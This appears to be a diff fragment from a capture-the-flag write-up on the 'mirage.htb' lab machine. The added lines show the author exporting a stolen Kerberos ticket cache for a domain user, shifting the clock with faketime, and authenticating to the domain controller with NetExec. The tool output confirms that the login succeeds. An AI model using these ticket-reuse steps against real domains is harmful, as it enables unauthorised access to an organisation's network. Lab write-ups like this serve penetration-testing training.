@@ -720,7 +720,15 @@ SMB         dc01.mirage.htb 445    dc01             [+] Run the following comman
 
 Then i can auth and get a TGT becuase i think there is a cleanup script thats resetting the account to change it back
 
+```python
+❯❯❯ export KRB5CCNAME=javier.ccache
 
+❯❯❯ faketime -f +7h nxc smb dc01.mirage.htb --use-kcache          
+SMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc01.mirage.htb 445    dc01             [+] MIRAGE.HTB\javier.mmarshall from ccache
+```
+
+Now i can auth using this TGT
 
 
 
